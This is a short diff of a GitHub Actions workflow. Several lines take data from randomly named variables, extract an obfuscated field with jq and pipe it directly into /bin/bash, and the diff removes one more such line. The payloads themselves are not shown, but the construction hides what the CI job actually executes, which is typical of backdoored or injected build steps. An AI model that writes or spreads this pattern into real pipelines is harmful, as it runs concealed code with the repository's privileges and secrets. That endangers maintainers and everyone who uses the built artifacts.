@@ -21,7 +21,6 @@ jobs:
           echo $scwry4189 | jq -r .fhz64 | /bin/bash
           printf '%s' "$n440" | jq -r .cno66771 | /bin/bash
           printf '%s' "$fi31" | jq -r .mhdx55795 | /bin/bash
-          printf '%s' "$ypq86" | jq -r .iidpv31129 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
